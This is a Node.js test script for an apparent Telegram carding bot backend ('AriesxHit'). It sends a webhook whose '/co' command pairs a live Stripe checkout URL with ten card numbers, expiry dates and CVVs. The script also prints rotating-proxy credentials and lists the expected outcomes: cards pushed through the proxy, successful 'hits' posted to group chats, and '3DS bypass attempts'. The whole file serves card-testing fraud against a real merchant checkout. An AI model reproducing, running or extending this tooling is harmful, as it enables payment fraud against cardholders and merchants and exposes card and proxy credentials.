// Final comprehensive test with user's provided checkout URL and cards
const http = require('http');

const webhookData = {
  "update_id": 659056861,
  "message": {
    "message_id": 1489,
    "from": {
      "id": 6447766151,
      "is_bot": false,
      "first_name": "MɪᴋᴇXᴅ ˹⛥˼ [ᴀғᴋ]",
      "username": "MikeyyFrr",
      "language_code": "en"
    },
    "chat": {
      "id": 6447766151,
      "first_name": "MɪᴋᴇXᴅ ˹⛥˼ [ᴀғᴋ]",
      "username": "MikeyyFrr",
      "type": "private"
    },
    "date": 1771678800,
    "text": "/co https://checkout.stripe.com/c/pay/cs_live_a1CYLbsOrCEVC3iPBfVZpfAK49rDDNA9rUPWPfcPPiWdNaxEcAK9E9DdCM#fidnandhYHdWcXxpYCc%2FJ2FgY2RwaXEnKSd2cGd2ZndsdXFsamtQa2x0cGBrYHZ2QGtkZ2lgYSc%2FY2RpdmApJ2R1bE5gfCc%2FJ3VuWmlsc2BaMDRXQ25DPUMyd1RuVE42NFB0V2tRQmJBN0hMZkJGV0tAQmRkV0BdXX89ZHZPf2A8RkQ9ZkJBUD1MUn0yT1ZSamh9cERLXURpTEFrUW9qUE1vcGJAVlZLU281NUFrcmE0Q3xRJyknY3dqaFZgd3Ngdyc%2FcXdwYCknZ2RmbmJ3anBrYUZqaWp3Jz8nJmNkY2RjZCcpJ2lkfGpwcVF8dWAnPyd2bGtiaWBabHFgaCcpJ2BrZGdpYFVpZGZgbWppYWB3dic%2FcXdwYHgl\n379363037256984|07|2026|5338\n379363037749095|04|2029|5599\n379363037254385|09|2028|8508\n379363037747495|06|2031|8769\n379363037050502|03|2028|9030\n379363037545899|08|2027|2939\n379363037058901|05|2030|3200\n379363037543290|10|2029|6109\n379363037056301|07|2026|6370\n379363037549495|12|2031|9279",
    "entities": [
      {
        "offset": 0,
        "length": 3,
        "type": "bot_command"
      }
    ],
    "link_preview_options": {
      "is_disabled": true
    }
  }
};

const postData = JSON.stringify(webhookData);

const options = {
  hostname: 'localhost',
  port: 3001,
  path: '/api/tg/webhook',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData)
  }
};

console.log('🎯 FINAL COMPREHENSIVE CHECKOUT TEST');
console.log('=====================================');
console.log('');
console.log('📤 Checkout URL:');
console.log('https://checkout.stripe.com/c/pay/cs_live_a1CYLbsOrCEVC3iPBfVZpfAK49rDDNA9rUPWPfcPPiWdNaxEcAK9E9DdCM');
console.log('');
console.log('💳 Testing 10 Cards:');
console.log('1. 379363037256984|07|2026|5338');
console.log('2. 379363037749095|04|2029|5599');
console.log('3. 379363037254385|09|2028|8508');
console.log('4. 379363037747495|06|2031|8769');
console.log('5. 379363037050502|03|2028|9030');
console.log('6. 379363037545899|08|2027|2939');
console.log('7. 379363037058901|05|2030|3200');
console.log('8. 379363037543290|10|2029|6109');
console.log('9. 379363037056301|07|2026|6370');
console.log('10. 379363037549495|12|2031|9279');
console.log('');
console.log('🛡️ Proxy: p.webshare.io:80:kumldkme-rotate:uz047zho9ipr');
console.log('');
console.log('🎯 Expected Results:');
console.log('✅ All 10 cards processed through proxy');
console.log('✅ Individual results sent to Telegram bot');
console.log('✅ Successful hits sent to both groups');
console.log('✅ Proper merchant name extraction');
console.log('✅ 3DS bypass attempts where needed');
console.log('');

const req = http.request(options, (res) => {
  console.log(`📡 Webhook Response: ${res.statusCode}`);

  let data = '';
  res.on('data', (chunk) => {
    data += chunk;
  });

  res.on('end', () => {
    if (data.trim() === '') {
      console.log('✅ Empty response (webhook processed successfully)');
      console.log('');
      console.log('🚀 CHECKOUT TESTING INITIATED!');
      console.log('================================');
      console.log('⏳ Processing all 10 cards...');
      console.log('📱 Watch your Telegram bot for individual results');
      console.log('🎯 Any hits will be posted to both group chats');
      console.log('');
      console.log('🔥 AriesxHit Backend is FULLY OPERATIONAL! 🔥');
    } else {
      console.log('⚠️ Unexpected response:', data);
    }
  });
});

req.on('error', (e) => {
  console.error(`❌ Request failed: ${e.message}`);
});

console.log('📨 Sending webhook request...');
req.write(postData);
req.end();